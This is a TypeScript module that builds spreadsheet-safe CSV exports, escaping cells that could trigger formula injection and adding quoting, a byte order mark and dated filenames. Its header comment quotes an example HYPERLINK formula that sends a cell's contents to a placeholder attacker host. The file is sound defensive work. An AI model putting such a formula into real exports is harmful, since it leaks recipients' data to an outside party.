/**
 * CSV that a spreadsheet will open safely.
 *
 * The trap is formula injection. A cell beginning `=`, `+`, `-`, `@`, or a tab
 * or carriage return, is interpreted by Excel and Sheets as a formula — so a
 * risk titled `=HYPERLINK("http://attacker/"&A1,"click")` becomes live content
 * in whatever the recipient opens. Governance exports are full of free text
 * somebody else typed, and they get emailed to auditors and regulators, which
 * is precisely the audience you least want to hand a working payload.
 *
 * The fix is to prefix a leading dangerous character with an apostrophe, which
 * spreadsheets strip on display. The value reads correctly and does nothing.
 */

const DANGEROUS_LEAD = /^[=+\-@\t\r]/;

export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";

  let text: string;
  if (value instanceof Date) text = value.toISOString();
  else if (typeof value === "object") text = JSON.stringify(value);
  else text = String(value);

  if (DANGEROUS_LEAD.test(text)) text = `'${text}`;

  // Quote whenever the value could otherwise break the row apart.
  if (/[",\n\r]/.test(text)) return `"${text.replace(/"/g, '""')}"`;
  return text;
}

export function csvRow(values: readonly unknown[]): string {
  return values.map(csvCell).join(",");
}

export const BOM = "﻿";

/**
 * @param withBom whether to lead with a byte order mark, so Excel reads UTF-8
 * rather than mangling every accent. Pass `false` when something else goes
 * first — the mark only works at byte zero, and in the middle of a file it
 * silently becomes part of the next value instead.
 */
export function toCsv(
  columns: readonly string[],
  rows: readonly (readonly unknown[])[],
  withBom = true,
): string {
  return (
    (withBom ? BOM : "") +
    [csvRow(columns), ...rows.map(csvRow)].join("\r\n") +
    "\r\n"
  );
}

/** A filename a person can find again six months later. */
export function exportFilename(dataset: string, organisation: string, when: Date): string {
  const slug = organisation
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-|-$/g, "");
  return `${slug}-${dataset}-${when.toISOString().slice(0, 10)}.csv`;
}
